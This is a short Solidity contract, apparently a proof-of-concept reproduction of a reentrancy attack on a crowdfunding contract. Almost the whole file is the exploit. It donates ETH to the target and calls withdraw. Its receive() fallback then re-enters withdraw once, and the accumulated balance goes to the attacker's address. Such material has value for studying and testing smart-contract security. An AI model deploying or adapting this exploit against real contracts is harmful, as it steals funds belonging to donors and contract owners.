interface ICrowdfund {
    function donate() external payable;
    function withdraw() external;
    function reclaim() external;
    function invstore() external;
    function invariant(uint choice) external;
}

contract Reproduction {
    ICrowdfund public target;
    address public attacker;
    bool public reentered;
    uint public exploitValue;

    constructor(address _target) {
        target = ICrowdfund(_target);
        attacker = msg.sender;
    }

    function setup() external payable {
        require(msg.value > 0, "Send ETH to start exploit");
        exploitValue = msg.value;
        target.donate{value: msg.value}();
    }

    function startExploit() external {
        target.invstore();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= exploitValue && !reentered) {
            reentered = true;
            target.withdraw();
        }
    }

    function triggerInvariantCheck() external {
        target.invariant(0);
    }

    function finalizeExploit() external {
        payable(attacker).transfer(address(this).balance);
    }
}